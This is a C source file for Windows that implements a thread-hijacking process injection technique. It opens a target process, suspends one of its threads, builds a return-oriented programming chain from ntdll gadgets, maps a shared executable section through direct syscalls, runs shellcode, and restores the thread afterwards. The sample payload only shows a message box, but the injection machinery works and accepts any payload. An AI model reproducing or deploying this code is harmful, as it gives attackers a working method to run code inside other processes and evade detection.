#include "ROP.h"

struct THREAD_DATA {
	DWORD threadId;
	DWORD processId;
	HANDLE hThread;
	HANDLE hProcess;

	BYTE* payload;
	DWORD payloadSize;

	DWORD64 oldRCX;

	DWORD64 oldRIP;
	DWORD64 newRIP;

	DWORD64 oldRSP;
	DWORD64 newRSP;


	HANDLE hRemoteSection;

	PDWORD64 ROP;
	DWORD ROPSize;

};

PVOID memmem(const void* haystack, size_t haystack_len, const void* needle, size_t needle_len)
{
	if (haystack == NULL) return NULL;
	if (haystack_len == 0) return NULL;
	if (needle == NULL) return NULL;
	if (needle_len == 0) return NULL;

	for (const char* h = (char*)haystack; haystack_len >= needle_len; h++, haystack_len--) {
		if (!memcmp(h, needle, needle_len)) {
			return (void*)h;
		}
	}
	return NULL;
}

DWORD findThread(THREAD_DATA* threadData) {
	THREADENTRY32 thread32 = { sizeof(THREADENTRY32) };
	HANDLE threadHandle = NULL;
	HANDLE threadSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, threadData->processId);

	if (!Thread32First(threadSnapshot, &thread32)) {
		printf("Error: coudn't get first thread from process snapshot (%d)\n", GetLastError());
		return 0;
	}
	do
	{
		if (thread32.th32OwnerProcessID != threadData->processId || thread32.th32ThreadID == 0) continue;

		threadHandle = OpenThread(THREAD_ALL_ACCESS, FALSE, thread32.th32ThreadID);

		if (threadHandle != INVALID_HANDLE_VALUE && threadHandle != NULL) {
			threadData->threadId = thread32.th32ThreadID;
			threadData->hThread = threadHandle;
			break;
		}

	} while (Thread32Next(threadSnapshot, &thread32));

	CloseHandle(threadSnapshot);
	return 0;
}


DWORD64 SearchRopGadgets(const void* ropGadget, size_t ropGadgetSize) {
	DWORD i = 0;
	HMODULE hModuleNtdll = GetModuleHandle(L"ntdll");
	PIMAGE_DOS_HEADER imageDosHeader = (PIMAGE_DOS_HEADER)hModuleNtdll;
	PIMAGE_NT_HEADERS imageNtHeaders = (PIMAGE_NT_HEADERS)((DWORD64)hModuleNtdll + imageDosHeader->e_lfanew);
	PIMAGE_SECTION_HEADER imageSectionHeader = (PIMAGE_SECTION_HEADER)IMAGE_FIRST_SECTION(imageNtHeaders);

	DWORD numberOfSections = imageNtHeaders->FileHeader.NumberOfSections;

	for (i = 0; i < numberOfSections; i++) {
		if (lstrcmp((LPCWSTR)imageSectionHeader->Name, L".text")) break;
	}

	DWORD64 ropGadgetAddress = (DWORD64)memmem((char*)imageSectionHeader, imageSectionHeader->SizeOfRawData, ropGadget, ropGadgetSize);

	if (ropGadgetAddress != NULL) return ropGadgetAddress;

	CloseHandle(hModuleNtdll);
	return NULL;
}

LPVOID CreateMappedSection(THREAD_DATA* threadData) {
	HANDLE hLocalSection = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, threadData->payloadSize, NULL);
	LPVOID address = MapViewOfFile(hLocalSection, FILE_MAP_READ | FILE_MAP_WRITE, NULL, NULL, NULL);
	DuplicateHandle(GetCurrentProcess(), hLocalSection, threadData->hProcess, &threadData->hRemoteSection, 0, 0, DUPLICATE_SAME_ACCESS);
	CloseHandle(hLocalSection);
	return address;
}

VOID CreatePayload(THREAD_DATA* threadData) {

	BYTE payload[] = {
		/*0: */			0x48, 0xB8, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,	// movabs  rax, 0x1111111111111111
		/*a: */			0x50,														// push rax
		/*b: */			0x49, 0x89, 0xe0, 											// mov r8, rsp
		/*e: */			0x48, 0xB8, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22,	// movabs  rax, 0x2222222222222222
		/*19: */		0x50,														// push rax
		/*1a: */		0x48, 0x89, 0xe2, 											// mov rdx, rsp
		/*1d: */		0x48, 0x31, 0xC9,											// xor rcx, rcx
		/*20: */		0x4D, 0x31, 0xC9,											// xor r9, r9
		/*23: */		0x48, 0x83, 0xEC, 0x28,										// sub rsp, 0x28
		/*27: */		0x48, 0xB8, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33,	// movabs  rax, 0x3333333333333333
		/*31: */		0xFF, 0xD0,													// call rax
		/*33: */		0x48, 0x83, 0xC4, 0x38,										// add rsp, 0x38
		/*37: */		0x48, 0x31, 0xc0,											// xor rax, rax
		/*3a: */		0xC3,														// ret
	};


	threadData->payload = payload;
	threadData->payloadSize = sizeof(payload);

	HMODULE hntdll = LoadLibraryA("user32");
	PVOID hMessageBoxA = (PVOID)GetProcAddress(hntdll, "MessageBoxA");

	char text[8] = "H3lLo!";
	char caption[8] = "W0rLd!";

	DWORD64 bytesWritten = 0;
	LPVOID address = CreateMappedSection(threadData);
	memcpy(address, payload, sizeof(payload));
	memcpy((memmem(address, sizeof(payload), "\x11\x11\x11\x11\x11\x11\x11\x11", 8)), text, 8);
	memcpy((memmem(address, sizeof(payload), "\x22\x22\x22\x22\x22\x22\x22\x22", 8)), caption, 8);
	memcpy(memmem(address, sizeof(payload), "\x33\x33\x33\x33\x33\x33\x33\x33", 8), &hMessageBoxA, 8);
	UnmapViewOfFile(address);


}

VOID CreateStableRiteOfPassageROP(THREAD_DATA* threadData) {

	DWORD64* ROP = (DWORD64*)malloc(1000 * sizeof(DWORD64));
	ZeroMemory(ROP, 1000 * sizeof(DWORD64));
	DWORD count = 0;
	HMODULE hModuleNtdll = GetModuleHandle(L"ntdll");
	DWORD64 popregs = SearchRopGadgets("\x58\x5A\x59\x41\x58\x41\x59\x41\x5A\x41\x5B\xC3", 12); /*	0:  58                  pop    rax
																								1:  5a                      pop    rdx
																								2:  59                      pop    rcx
																								3:  41 58                   pop    r8
																								5:  41 59                   pop    r9
																								7:  41 5a                   pop    r10
																								9:  41 5b                   pop    r11
																								10: c3						ret	*/



	DWORD64 syscall = (DWORD64)GetProcAddress((HMODULE)hModuleNtdll, "NtYieldExecution") + 0x12;

	DWORD64 pivotGadget = SearchRopGadgets("\x5C\xC3", 2); /*	0: 5c				pop rsp
																1: c3				ret*/

	DWORD64 add28 = SearchRopGadgets("\x48\x83\xC4\x28\xC3", 5); /*	0: add rsp, 0x28
																	1: ret*/
	DWORD64 add58 = SearchRopGadgets("\x48\x83\xC4\x58\xC3", 5); /*	0: add rsp, 0x58
																	1: ret*/
	DWORD64 poprax = add58 + 3;
	DWORD64 poprcx = SearchRopGadgets("\x59\xC3", 2);

	DWORD64 ret = SearchRopGadgets("\xC3", 1);

	DWORD64 movraxrcx = SearchRopGadgets("\x48\x89\x01\xC3", 4); // mov [rcx], rax; ret
	DWORD64 RtlCaptureContext = (DWORD64)GetProcAddress((HMODULE)hModuleNtdll, "RtlCaptureContext");




	DWORD64 ContextAddress = count++;

	DWORD ret_count = 0;

	if (!(((DWORD64)threadData->newRSP + 2 * sizeof(DWORD64)) & 0xF))
	{
		ROP[count++] = ret;
		ret_count++;
	}
	ROP[count++] = RtlCaptureContext;
	ROP[count++] = add28;
	ROP[count++] = NULL;
	ROP[count++] = NULL;
	ROP[count++] = NULL;
	ROP[count++] = NULL;
	ROP[count++] = NULL;


	ROP[count++] = poprax;
	ROP[count++] = threadData->oldRCX;
	ROP[count++] = poprcx;
	DWORD64 contextRcxAddress = count++;
	ROP[count++] = movraxrcx;

	ROP[count++] = poprax;
	ROP[count++] = threadData->oldRSP;
	ROP[count++] = poprcx;
	DWORD64 contextRspAddress = count++;
	ROP[count++] = movraxrcx;

	ROP[count++] = poprax;
	ROP[count++] = threadData->oldRIP;
	ROP[count++] = poprcx;
	DWORD64 contextRipAddress = count++;
	ROP[count++] = movraxrcx;

	if (!(((DWORD64)threadData->newRSP + (33 + ret_count) * sizeof(DWORD64)) & 0xF))
	{
		ROP[count++] = ret;
		ret_count++;
	}


	ROP[count++] = popregs;
	ROP[count++] = 0x28;
	ROP[count++] = -1;
	ROP[count++] = (DWORD64)threadData->hRemoteSection;
	DWORD64 payloadAddress = count++;
	ROP[count++] = NULL;
	ROP[count++] = (DWORD64)threadData->hRemoteSection;
	ROP[count++] = NULL;
	ROP[count++] = syscall;
	ROP[count++] = add58;
	ROP[count++] = NULL;
	ROP[count++] = NULL;
	ROP[count++] = NULL;
	ROP[count++] = NULL;
	ROP[count++] = 0;
	ROP[count++] = NULL;
	DWORD64 ViewSize = count++;
	ROP[count++] = 2;
	ROP[count++] = NULL;
	ROP[count++] = PAGE_EXECUTE_READ;
	ROP[count++] = NULL;

	ROP[payloadAddress] = (DWORD64)threadData->newRSP + sizeof(DWORD64) * count++;


	if (!(((DWORD64)threadData->newRSP + (55 + ret_count) * sizeof(DWORD64)) & 0xF))
	{
		ROP[count++] = ret;
		ret_count++;
	}

	ROP[count++] = popregs;
	ROP[count++] = 0x43;
	ROP[count++] = 0;
	DWORD64 ContextAddressForRCX = count++;
	ROP[count++] = NULL;
	ROP[count++] = NULL;
	DWORD64 ContextAddressForR10 = count++;
	ROP[count++] = NULL;
	ROP[count++] = syscall;
	ROP[count++] = add28;
	ROP[count++] = NULL;
	ROP[count++] = NULL;
	ROP[count++] = NULL;
	ROP[count++] = NULL;
	ROP[count++] = NULL;


	ROP[ViewSize] = (DWORD64)threadData->newRSP + sizeof(DWORD64) * count;
	ROP[count++] = threadData->payloadSize;


	ROP[contextRcxAddress] = (DWORD64)threadData->newRSP + sizeof(DWORD64) * count;
	ROP[count++] = ROP[ContextAddress] + (DWORD64)(&((CONTEXT*)0)->Rcx);

	ROP[contextRspAddress] = (DWORD64)threadData->newRSP + sizeof(DWORD64) * count;
	ROP[count++] = ROP[ContextAddress] + (DWORD64)(&((CONTEXT*)0)->Rsp);

	ROP[contextRipAddress] = (DWORD64)threadData->newRSP + sizeof(DWORD64) * count;
	ROP[count++] = ROP[ContextAddress] + (DWORD64)(&((CONTEXT*)0)->Rip);


	ROP[count++] = NULL;
	ROP[count++] = NULL;
	ROP[ContextAddress] = ((DWORD64)threadData->newRSP + sizeof(DWORD64) * count) & 0xFFFFFFFFFFFFFFF0;
	ROP[ContextAddressForRCX] = ROP[ContextAddress];
	ROP[ContextAddressForR10] = ROP[ContextAddress];
	ROP[contextRcxAddress] = ROP[ContextAddress] + (DWORD64)(&((CONTEXT*)0)->Rcx);
	ROP[contextRspAddress] = ROP[ContextAddress] + (DWORD64)(&((CONTEXT*)0)->Rsp);
	ROP[contextRipAddress] = ROP[ContextAddress] + (DWORD64)(&((CONTEXT*)0)->Rip);
	count += (sizeof(CONTEXT) / sizeof(DWORD64));



	threadData->ROP = ROP;
	threadData->ROPSize = count * sizeof(DWORD64);
	threadData->newRIP = poprcx;



}

DWORD Start(THREAD_DATA* threadData) {

	threadData->threadId = GetThreadId(threadData->hThread);

	CONTEXT ctx;
	ctx.ContextFlags = CONTEXT_FULL;
	SuspendThread(threadData->hThread);
	BOOL success = GetThreadContext(threadData->hThread, &ctx);

	threadData->oldRSP = ctx.Rsp;
	threadData->oldRIP = ctx.Rip;
	threadData->oldRCX = ctx.Rcx;
	threadData->newRSP = ctx.Rsp - 0x2000;

	CreateStableRiteOfPassageROP(threadData);
	ctx.Rsp = threadData->newRSP;
	ctx.Rip = threadData->newRIP;

	SetThreadContext(threadData->hThread, &ctx);
	DWORD64 bytesWritten = 0;
	WriteProcessMemory(threadData->hProcess, (PVOID)threadData->newRSP, threadData->ROP, threadData->ROPSize, &bytesWritten);
	ResumeThread(threadData->hThread);
	return 0;
}

#define PROCESS_ID 39360


int main() {

	THREAD_DATA* threadData = (THREAD_DATA*)malloc(sizeof(THREAD_DATA));
	threadData->processId = PROCESS_ID;
	threadData->hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, threadData->processId);
	findThread(threadData);
	CreatePayload(threadData);
	Start(threadData);

}